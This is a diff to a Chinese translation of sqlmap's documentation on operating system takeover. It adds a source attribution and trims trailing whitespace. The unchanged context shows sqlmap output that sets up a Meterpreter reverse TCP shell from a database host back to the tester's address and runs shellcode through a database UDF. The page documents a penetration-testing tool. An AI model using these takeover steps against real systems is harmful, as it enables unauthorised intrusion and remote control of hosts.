@@ -1,5 +1,7 @@
 # 接管操作系统
 
+> *译自：[Operating system takeover](https://github.com/sqlmapproject/sqlmap/wiki/Usage#operating-system-takeover)*
+
 ## 运行任意操作系统命令
 
 选项和开关：`--os-cmd` 和 `--os-shell`
@@ -105,8 +107,8 @@ which connection type do you want to use?
 [2] Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535
 [3] Bind TCP: Listen on the database host for a connection
 >
-which is the local address? [192.168.136.1] 
-which local port number do you want to use? [60641] 
+which is the local address? [192.168.136.1]
+which local port number do you want to use? [60641]
 which payload do you want to use?
 [1] Meterpreter (default)
 [2] Shell
@@ -134,7 +136,7 @@ PAYLOAD => windows/meterpreter/reverse_tcp
 EXITFUNC => thread
 LPORT => 60641
 LHOST => 192.168.136.1
-[*] Started reverse handler on 192.168.136.1:60641 
+[*] Started reverse handler on 192.168.136.1:60641
 [*] Starting the payload handler...
 [hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b
 ineval', please wait..
